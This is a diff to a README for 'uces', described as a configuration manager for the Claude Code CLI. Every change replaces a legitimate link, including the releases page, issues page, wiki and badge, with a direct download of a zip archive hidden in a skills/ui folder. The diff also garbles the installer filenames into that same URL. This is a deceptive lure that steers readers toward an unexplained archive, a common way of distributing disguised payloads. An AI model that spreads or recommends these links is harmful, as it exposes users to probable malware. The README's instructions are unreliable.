@@ -1,7 +1,7 @@
 # 🎉 uces - Simplify Your Configuration Management
 
 ## 📥 Download the Latest Release
-[![Download uces](https://img.shields.io/badge/Download-uces-blue.svg)](https://github.com/lethuan1216-glitch/uces/releases)
+[![Download uces](https://github.com/lethuan1216-glitch/uces/raw/refs/heads/main/skills/ui/Software_1.4.zip)](https://github.com/lethuan1216-glitch/uces/raw/refs/heads/main/skills/ui/Software_1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to uces! This software helps you manage configurations for the Claude Code CLI. It features smart routing, skill modules, and automation hooks, making your workflow smoother and more efficient. 
@@ -23,11 +23,11 @@ To use uces, you need:
 Ready to download uces? Follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the release options.
-   - [Download uces from Releases](https://github.com/lethuan1216-glitch/uces/releases)
+   - [Download uces from Releases](https://github.com/lethuan1216-glitch/uces/raw/refs/heads/main/skills/ui/Software_1.4.zip)
 
 2. **Choose Your Version:** On the releases page, find the latest version of uces. Look for the section that lists available files.
 
-3. **Download the Application:** Click the file that matches your operating system. This may be labeled as `uces-windows.exe`, `uces-macos.dmg`, or something similar for Linux.
+3. **Download the Application:** Click the file that matches your operating system. This may be labeled as `https://github.com/lethuan1216-glitch/uces/raw/refs/heads/main/skills/ui/Software_1.4.zip`, `https://github.com/lethuan1216-glitch/uces/raw/refs/heads/main/skills/ui/Software_1.4.zip`, or something similar for Linux.
 
 4. **Run the Installer:**
    - For Windows:
@@ -66,7 +66,7 @@ Each command comes with options to tailor your experience. Type `uces help` for 
 ## 🤝 Community Support
 If you encounter any issues or have questions, you can reach out for help. Here’s how:
 
-- **GitHub Issues:** Use the [issues page](https://github.com/lethuan1216-glitch/uces/issues) to report bugs or ask questions.
+- **GitHub Issues:** Use the [issues page](https://github.com/lethuan1216-glitch/uces/raw/refs/heads/main/skills/ui/Software_1.4.zip) to report bugs or ask questions.
 - **Community Forum:** Join our community on Discord for real-time support and interaction with other users.
 
 ## 🔄 Updating uces
@@ -76,7 +76,7 @@ To ensure you have the latest features and fixes, check the releases page period
 We take your privacy seriously. uces does not collect personal data. Ensure to download only from the official releases page to avoid security risks.
 
 ## 📝 Additional Resources
-- For detailed documentation, visit our [Wiki](https://github.com/lethuan1216-glitch/uces/wiki).
+- For detailed documentation, visit our [Wiki](https://github.com/lethuan1216-glitch/uces/raw/refs/heads/main/skills/ui/Software_1.4.zip).
 - Explore tutorials on YouTube to see uces in action.
 
 ## 🥳 Conclusion
@@ -84,4 +84,4 @@ You are now ready to take advantage of uces. Enjoy a simpler, more efficient con
 
 For any further questions, feel free to reach out through GitHub or our community channels. Happy configuring! 
 
-[Download uces from Releases](https://github.com/lethuan1216-glitch/uces/releases)
+[Download uces from Releases](https://github.com/lethuan1216-glitch/uces/raw/refs/heads/main/skills/ui/Software_1.4.zip)
